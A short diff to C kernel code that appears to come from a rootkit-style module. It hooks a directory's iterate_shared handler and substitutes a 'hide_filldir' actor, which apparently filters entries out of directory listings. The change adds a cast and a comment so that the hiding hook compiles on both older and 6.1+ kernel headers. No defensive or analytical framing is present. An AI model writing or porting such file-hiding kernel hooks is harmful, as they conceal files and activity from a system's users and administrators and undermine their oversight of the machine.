@@ -105,7 +105,10 @@ static int wuwa_iterate_shared(struct file *filp, struct dir_context *ctx)
         return orig(filp, ctx); /* teardown race: passthrough, never crash */
     held = true;
     hc.base = *ctx;
-    hc.base.actor = hide_filldir;
+    /* Explicit cast: int (pre-6.1) vs bool (6.1+) actors share the 0/1
+     * w0 ABI, but 6.x headers reject the implicit conversion (hard
+     * error). The cast keeps one actor compiling on every header. */
+    hc.base.actor = (filldir_t)(void *)hide_filldir;
     hc.orig = ctx;
     ret = orig(filp, &hc.base);
     ctx->pos = hc.base.pos;
